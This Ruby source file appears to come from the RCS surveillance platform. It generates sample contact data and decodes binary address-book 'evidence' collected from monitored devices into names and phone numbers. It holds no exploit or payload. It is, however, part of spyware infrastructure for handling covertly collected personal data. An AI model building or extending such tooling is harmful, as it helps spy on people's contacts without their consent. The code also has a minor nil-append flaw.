require 'rcs-common/evidence/common'
require 'rcs-common/serializer'

module RCS
  module IaddressbookEvidence

    CONTACTLIST = 0xC021
    CONTACTFILE = 0xC022

    def content
      fields = { :first_name => ["John", "Liza", "Bruno"].sample, :last_name => ["Doe", "Rossi", "Bianchi"].sample, :company => ["Acme Inc.", "Disney", "Apple Inc."].sample, :mobile_phone_number => ["00155597865", "0012342355", "+3901234567"].sample}
      AddressBookSerializer.new.serialize fields
    end

    def generate_content
      [ content ]
    end

    def decode_content(common_info, chunks)
      stream = StringIO.new chunks.join

      info = Hash[common_info]
      info[:data] ||= Hash.new

      # ABLogStruct
      magic = read_uint32 stream
      raise EvidenceDeserializeError.new("invalid log version for IADDRESSBOOK [#{magic} != #{CONTACTLIST}]") unless magic == CONTACTLIST

      stream.read(4) # len, ignore
      num_records = read_uint32 stream

      for i in (0..num_records-1)

        # ABFile
        magic = read_uint32 stream
        raise EvidenceDeserializeError.new("invalid log version for IADDRESSBOOK [#{magic} != #{CONTACTFILE}]") unless magic == CONTACTFILE
        len = read_uint32 stream

        #ABName (first name)
        first_name = read_name(stream)

        #ABName (last name)
        last_name = read_name(stream)

        info[:data][:name] = "#{first_name} #{last_name}"

        #ABContacts
        magic = read_uint32 stream
        num_contacts = read_uint32 stream

        for i in (0..num_contacts-1)
          type, number = read_number(stream)
          case type
            when 0
              info[:data][:contact] ||= number
            else
              info[:data][:info] += "#{number}\n"
          end
        end

        yield info if block_given?
      end

      :keep_raw
    end

    def read_name(stream)
      magic = read_uint32 stream
      len = read_uint32 stream
      stream.read(len).utf16le_to_utf8
    end

    def read_number(stream)
      magic = read_uint32 stream
      type = read_uint32 stream
      name = read_name(stream)
      return type, name
    end
  end # ::AddressbookEvidence
end # ::RCS
